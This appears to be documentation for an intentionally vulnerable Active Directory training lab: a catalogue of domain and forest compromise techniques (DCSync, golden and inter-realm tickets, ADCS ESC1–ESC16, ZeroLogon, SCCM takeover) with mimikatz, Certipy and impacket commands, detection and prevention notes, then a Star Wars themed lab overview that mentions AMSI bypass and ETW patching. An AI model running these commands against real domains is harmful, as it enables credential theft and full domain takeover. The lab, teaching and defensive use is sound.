# 07 — Domain & Forest Compromise (DF-001..040)

End game. These are the techniques that turn "I have a foothold" into "I own the forest." Many depend on chains from earlier docs (CRED + LAT + ADCS).

---

### DF-001 — Golden Ticket
See PER-018. Forge TGT with krbtgt hash → impersonate any principal in the domain.

---

### DF-002 — Silver Ticket
See PER-019.

---

### DF-003 — DCSync All Hashes
**What it is:** dump every credential in the domain (NT hashes + Kerberos keys + machine secrets + krbtgt). End-state credential access.
**Tools:** `impacket-secretsdump -just-dc`.
**Steps:**
```bash
impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc
```
**Detection:** Defender for Identity native; non-DC IP issuing DRSR.
**Prevention:** audit DCSync rights; remove non-DC principals with `Replicating Directory Changes (All)`.

---

### DF-004 — DCShadow
See CRED-015.

---

### DF-005 — SID-History Injection (Forest)
See PER-016. Cross-forest variant: inject Enterprise Admin SID from foreign forest.

---

### DF-006 — Trust Ticket Abuse (Inter-Realm TGT)
**What it is:** with the trust key (`TrustKey2024!`), forge an inter-realm TGT for the trusted forest's krbtgt.
**Tools:** mimikatz `kerberos::golden /service:krbtgt /target:rebel.local /sid:EMPIRE /rc4:TRUSTHASH`.
**Detection:** anomalous inter-realm `4769`s.
**Prevention:** rotate trust keys; selective auth; SID filtering.

---

### DF-007 — ExtraSID Parent-Child
**What it is:** in a parent-child trust, SID filtering is *not* applied — a child-domain admin can forge a TGT with parent's Enterprise Admin SID (RID 519) and become EA.
**Why it works here:** `eu.empire.local` is a child of `empire.local`.
**Tools:** mimikatz `kerberos::golden /sids:S-1-5-21-EMPIRE-519`.
**Steps:**
```powershell
# from eu.empire.local DA, knowing eu.empire.local krbtgt hash:
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:eu.empire.local /sid:S-1-5-21-EU /sids:S-1-5-21-EMPIRE-519,S-1-5-21-EMPIRE-512 /krbtgt:EUKRBHASH /ptt"
.\mimikatz.exe "lsadump::dcsync /domain:empire.local /user:krbtgt"
```
**Detection:** MDI native alert; abnormal cross-domain TGS with EA SIDs.
**Prevention:** there is *no built-in SID filtering on parent-child trusts*. The mitigation is treating every child-domain admin as forest admin. Modern advice: one forest, one domain.

---

### DF-008 — SID Filtering Bypass
**What it is:** external/forest trust with SID filtering disabled allows the cross-forest TGT to carry arbitrary SIDs.
**Tools:** mimikatz golden + foreign SID.
**Detection:** MDI.
**Prevention:** ensure SID filtering is enabled (`netdom trust /enablesidhistory:no`); quarantine attribute.

---

### DF-009 — Foreign Security Principal Hijack
See LAT-034.

---

### DF-010 — Cross-Forest Kerberoasting
**What it is:** services in a trusted forest still have crackable SPNs reachable via the trust. Kerberoast across.
**Tools:** `Rubeus kerberoast /domain:rebel.local`, `impacket-GetUserSPNs -target-domain rebel.local`.
**Detection:** abnormal cross-realm TGS requests.
**Prevention:** AES-only; gMSAs; selective auth.

---

### DF-011 — ADCS ESC8 (Web Enrollment NTLM Relay)
**What it is:** HTTP web enrollment + NTLM + no EPA = relay any coerced auth → cert for DC$ → DCSync.
**Tools:** `ntlmrelayx --adcs --template DomainController`, `PetitPotam`/`Coercer`.
**Steps:** see CRED-020 (chain).
**Detection:** MDI ADCS ESC8 alert; abnormal ADCS certs issued to DC$ by non-DC requester.
**Prevention:** disable NTLM on ADCS web; enable EPA; require HTTPS; certificate auth only.

---

### DF-012 — ADCS ESC1 (SAN-spec template)
**What it is:** vulnerable template properties: `mspki-certificate-name-flag = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + EKU Client Auth + Domain Users enroll + no manager approval. Request a cert specifying SAN = `Administrator@empire.local` → PKINIT as DA.
**Why it works here:** Ansible publishes `ESC1Template`.
**Tools:** `Certipy`.
**Steps:**
```bash
certipy find -u peter.parker -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template ESC1Template \
   -upn Administrator@empire.local -target endor.empire.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# now NT hash for Administrator
```
**Detection:** ADCS `4886`/`4887` with requester ≠ SAN; MDI ESC1.
**Prevention:** remove `ENROLLEE_SUPPLIES_SUBJECT` from templates with Client Auth EKU; require manager approval.

---

### DF-013 — ADCS ESC2 (Any Purpose / SubCA EKU)
**What it is:** template with EKU "Any Purpose" or empty → cert usable for any purpose, including SubCA (sign other certs).
**Tools:** `Certipy req -template ESC2Template`.
**Detection:** ADCS abnormal EKU on issued certs.
**Prevention:** never publish templates with "Any Purpose" EKU enrollable by users.

---

### DF-014 — ADCS ESC3 (Enrollment Agent Template)
See CRED-047.

---

### DF-015 — ADCS ESC4 (Vulnerable Template ACL)
**What it is:** `GenericAll`/`WriteDACL` on a template → modify it to be ESC1 → exploit.
**Tools:** `Certipy template -save-old`.
**Steps:**
```bash
certipy template -u peter.parker -p 'EmpireLab2024!' -template ESC4Template -save-old
# then exploit as ESC1
```
**Detection:** Event `5136` on template object; MDI ESC4.
**Prevention:** audit template DACLs; restrict to PKI admins.

---

### DF-016 — ADCS ESC5 (PKI Object ACL)
**What it is:** weak ACL on CA / PKI containers (NTAuthCertificates, Enrollment Services).
**Tools:** `Certipy ca`, `Certipy find`.
**Detection:** Event `5136` on PKI containers.
**Prevention:** audit ACLs under `CN=Public Key Services,CN=Services,CN=Configuration`.

---

### DF-017 — ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
See CRED-027.

---

### DF-018 — ADCS ESC7 (Manager/Officer role abuse)
**What it is:** low-priv Certificate Manager / Officer can approve pending requests. Submit a sketchy cert request, approve it yourself.
**Tools:** `Certipy ca -issue-request`.
**Steps:**
```bash
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template User -upn Administrator@empire.local
# request goes to pending; with officer rights:
certipy ca -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -issue-request <ID>
certipy req -retrieve <ID>
```
**Detection:** ADCS audit logs; officer approval of unusual requests.
**Prevention:** require multi-person approval; restrict officer membership.

---

### DF-019 — ADCS ESC8 (duplicate of DF-011 with explicit relay flow)
See DF-011.

---

### DF-020 — ADCS ESC9 (No Security Extension)
**What it is:** template flag `CT_FLAG_NO_SECURITY_EXTENSION` set → cert doesn't carry the user's SID. If `StrongCertificateBindingEnforcement` is loose, you can rebind the cert to a different user via altSecurityIdentities.
**Tools:** Certipy ESC9.
**Detection:** abnormal altSecurityIdentities writes.
**Prevention:** remove `CT_FLAG_NO_SECURITY_EXTENSION`; KB5014754 strict mapping.

---

### DF-021 — ADCS ESC10 (Weak CA Reg / Cert Publishers ACL)
**What it is:** writable CA registry / Cert Publishers group → publish your own cert or modify CA flags.
**Detection:** Event `4670` on CA reg.
**Prevention:** tier CA admins.

---

### DF-022 — ADCS ESC11 (NTLM Relay to ICPR RPC)
**What it is:** RPC interface `ICertPassage` (ICPR) accepts NTLM and isn't EPA-protected → relay to issue certs.
**Tools:** `ntlmrelayx -t rpc://endor --adcs`.
**Detection:** abnormal ICPR sessions.
**Prevention:** enforce Kerberos on CA RPC; EPA; ADV230002.

---

### DF-023 — Child → Enterprise Admin (no SID filtering)
See DF-007.

---

### DF-024 — noPac
See CRED-023.

---

### DF-025 — Certifried
See CRED-024.

---

### DF-026 — CVE-2022-33647 (S4U2Self LPE chain to EoP)
Prevention: patch.

---

### DF-027 — sAMAccountName spoofing across trust
**What it is:** noPac across trust boundary — rename machine to foreign DC's sAMAccountName → forge cross-realm TGT.
**Detection:** anomalous foreign-realm Kerberos; MDI.
**Prevention:** patch KB5008380; MachineAccountQuota=0.

---

### DF-028 — Read-Only DC Abuse (PRP)
**What it is:** Password Replication Policy on RODC reveals cached credentials. With RODC admin, expand the list (`Allowed-RODC-Password-Replication-Group`).
**Tools:** mimikatz `lsadump::dcsync /domain:empire.local /dc:rodc01 /user:Administrator` (against allowed accounts).
**Detection:** Event `4742` on `msDS-RevealOnDemandGroup`.
**Prevention:** strict PRP; RODC admin only for trusted ops.

---

### DF-029 — GPO Delegation → DA
See PE-018 / PER-034.

---

### DF-030 — Schema Admin Hijack
See PER-031.

---

### DF-031 — ADCS ESC13 (Issuance Policy → Group)
**What it is:** template's Issuance Policy OID is linked to a privileged group via `msDS-OIDToGroupLink`. Enrolling the template grants effective membership in that group.
**Tools:** `Certipy req -template ESC13Template`.
**Steps:**
```bash
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template ESC13Template
certipy auth -pfx peter.parker.pfx
# resulting TGT carries the linked group SID in PAC
```
**Detection:** ADCS audit + MDI ESC13.
**Prevention:** never link issuance policies to privileged groups; review `msDS-OIDToGroupLink`.

---

### DF-032 — ADCS ESC14 (Explicit Cert Mapping)
**What it is:** with `altSecurityIdentities` write on a victim AD object + a cert you control, map cert→victim. PKINIT auth → victim's TGT.
**Tools:** Certipy + `Set-ADUser -Add @{altSecurityIdentities=...}`.
**Detection:** Event `5136` on altSecurityIdentities; KB5014754 strict mapping rejects.
**Prevention:** strict cert mapping (KB5014754); audit altSecurityIdentities writes.

---

### DF-033 — ADCS ESC15 (EKUwu / CVE-2024-49019)
See CRED-028.

---

### DF-034 — ADCS ESC16 (CA-wide No Security Extension)
**What it is:** CA registry `DisableExtensionList` includes `szOID_NTDS_CA_SECURITY_EXT` → *all* issued certs miss the user-SID extension → ESC9-like, but for the whole CA.
**Tools:** `Certipy ca -disable-extension`.
**Detection:** registry change to CA `DisableExtensionList`.
**Prevention:** never disable szOID_NTDS_CA_SECURITY_EXT; require strict mapping.

---

### DF-035 — ZeroLogon (CVE-2020-1472)
**What it is:** Netlogon AES-CFB8 IV-of-zeros bug — set DC$ password to empty via crafted NetrServerAuthenticate2 calls. Then DCSync as DC.
**Why it works here:** `FullSecureChannelProtection=0`, unpatched.
**Tools:** `zerologon_tester.py`, `cve-2020-1472-exploit.py`.
**Steps:**
```bash
python3 zerologon_tester.py coruscant 10.10.0.10           # test
python3 cve-2020-1472-exploit.py coruscant 10.10.0.10      # exploit, sets DC$ password to empty
impacket-secretsdump -no-pass 'coruscant$'@10.10.0.10 -just-dc
# !!! restore DC password before leaving: reinstall_original_pw.py — otherwise replication breaks
```
**Detection:** MDI native; Event `5827` (Netlogon insecure RPC).
**Prevention:** patch (August 2020 cumulative); `FullSecureChannelProtection=1`.

---

### DF-036 — MS14-068
See CRED-063.

---

### DF-037 — Cross-Forest Trust Ticket with EA SID
See DF-006/008 — combined.

---

### DF-038 — Foreign Group Membership Privilege Escalation
See LAT-034.

---

### DF-039 — SCCM Site Takeover
**What it is:** SCCM with NAA + HTTP MP → harvest NAA creds → push-install coerces machine auth → relay to MSSQL site DB → site admin.
**Tools:** `sccmhunter`, `SharpSCCM`, `ntlmrelayx -t mssql://`.
**Steps:**
```bash
sccmhunter find -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc-ip 10.10.0.10
sccmhunter naa -u peter.parker -p 'EmpireLab2024!' -t sccm.empire.local
```
**Detection:** SCCM audit logs; abnormal MSSQL `EXECUTE AS`; MDI.
**Prevention:** disable NAA; enhanced HTTP/PKI mode; tier SCCM admins.

---

### DF-040 — Diamond + Sapphire cross-forest persistence
See PER-021/022 applied with foreign krbtgt + SID History to maintain Enterprise Admin across forests.

---

Next: [`08-solve-path.md`](08-solve-path.md) — full canonical solve + wireframe diagrams of every solving pattern.

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
